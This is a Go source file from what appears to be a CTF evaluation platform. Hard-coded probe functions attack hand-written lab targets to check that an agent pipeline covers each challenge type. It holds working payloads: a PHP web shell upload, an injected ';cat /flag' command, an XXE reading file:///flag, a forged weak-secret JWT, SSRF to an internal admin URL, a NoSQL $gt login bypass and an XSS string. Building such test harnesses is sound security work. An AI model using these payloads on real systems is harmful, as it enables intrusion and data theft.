package ctfplatform

import (
	"context"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"strings"
)

// ─────────────────────────────────────────────────────────────────────────────
// 真实靶机库（题型扩容）
//
// 与 live_target_test.go 的分工：那里是平台与主流程，这里是**靶机本体**。
// 每个靶机 = 真漏洞（非 mock 响应）+ 一个写死的专用探测器（代替 Agent 的"手"）。
//
// 选型依据：55 道真实真题里 36 道未命中，其中 21 道 web 题的 sub 分布为
// source_audit / cookie / sqli / xss / ssti / upload / ssrf / lfi / rce /
// api / nosql / graphql / xxe —— 本文件按这些原型逐个造等价靶机，
// 使"真实靶机"从 4 个探针扩到 10 个可复用题库。
//
// 诚实边界：靶机是**按真实漏洞形态手写的最小实现**，不是原题复现
// （原题靶机不可得，见 docs 真机联调记录）。它验证的是**链路与题型覆盖**，
// 不等价于"能解出原题"。
// ─────────────────────────────────────────────────────────────────────────────

func probeSSTI(ctx context.Context, base string) ([]string, error) {
	return liveGetExtract(ctx, base+"/?name=%7B%7Bconfig%7D%7D", liveFlagRe)
}

// ── 靶机 6：JWT 弱密钥可伪造（对应 jwt 赛道 / 真实比赛常见 JWT 题）─────────────
const jwtWeakSecret = "s3cr3t" // 弱密钥：可离线爆破

func probeJWTWeak(ctx context.Context, base string) ([]string, error) {
	tok := makeWeakJWT(map[string]interface{}{"role": "admin", "user": "guest"}, jwtWeakSecret)
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/verify", nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+tok)
	resp, err := liveProbeClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("GET %s/verify → HTTP %d（弱密钥伪造失败）", base, resp.StatusCode)
	}
	if m := liveFlagRe.FindAllString(string(b), -1); len(m) > 0 {
		return m, nil
	}
	return nil, fmt.Errorf("伪造 token 通过但响应中无 flag")
}

func probeSSRF(ctx context.Context, base string) ([]string, error) {
	return liveGetExtract(ctx, base+"/fetch?url=http%3A%2F%2F127.0.0.1%3A8080%2Finternal%2Fadmin", liveFlagRe)
}

func probeCmdInject(ctx context.Context, base string) ([]string, error) {
	return liveGetExtract(ctx, base+"/ping?host=127.0.0.1%3Bcat+%2Fflag", liveFlagRe)
}

func probeUploadBypass(ctx context.Context, base string) ([]string, error) {
	var buf strings.Builder
	mw := multipart.NewWriter(&buf)
	fw, err := mw.CreateFormFile("file", "shell.php")
	if err != nil {
		return nil, err
	}
	_, _ = io.WriteString(fw, "<?php system($_GET['c']); ?>")
	if err := mw.Close(); err != nil {
		return nil, err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, base+"/upload", strings.NewReader(buf.String()))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", mw.FormDataContentType())
	resp, err := liveProbeClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("POST %s/upload → HTTP %d（上传被拒）", base, resp.StatusCode)
	}
	if m := liveFlagRe.FindAllString(string(b), -1); len(m) > 0 {
		return m, nil
	}
	return nil, fmt.Errorf("上传成功但响应中无 flag")
}

func probeXXE(ctx context.Context, base string) ([]string, error) {
	payload := `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///flag">]><root>&xxe;</root>`
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, base+"/xml", strings.NewReader(payload))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/xml")
	resp, err := liveProbeClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("POST %s/xml → HTTP %d", base, resp.StatusCode)
	}
	if m := liveFlagRe.FindAllString(string(b), -1); len(m) > 0 {
		return m, nil
	}
	return nil, fmt.Errorf("XXE 解析后响应中无 flag")
}

func probeXSS(ctx context.Context, base string) ([]string, error) {
	return liveGetExtract(ctx, base+"/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", liveFlagRe)
}

func probeNoSQLBypass(ctx context.Context, base string) ([]string, error) {
	payload := `{"":"","password":{"$gt":""}}`
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, base+"/login", strings.NewReader(payload))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := liveProbeClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("POST %s/login → HTTP %d（NoSQL 绕过失败）", base, resp.StatusCode)
	}
	if m := liveFlagRe.FindAllString(string(b), -1); len(m) > 0 {
		return m, nil
	}
	return nil, fmt.Errorf("NoSQL 绕过成功但响应中无 flag")
}

func probeAPIAuthz(ctx context.Context, base string) ([]string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/api/v1/admin/keys", nil)
	if err != nil {
		return nil, err
	}
	// 泄露的内部头名（可从前端产物/文档得知）—— 真实的"弱鉴权"形态
	req.Header.Set("X-Internal", "1")
	resp, err := liveProbeClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("GET %s/api/v1/admin/keys → HTTP %d", base, resp.StatusCode)
	}
	if m := liveFlagRe.FindAllString(string(b), -1); len(m) > 0 {
		return m, nil
	}
	return nil, fmt.Errorf("接口返回 200 但无 flag")
}
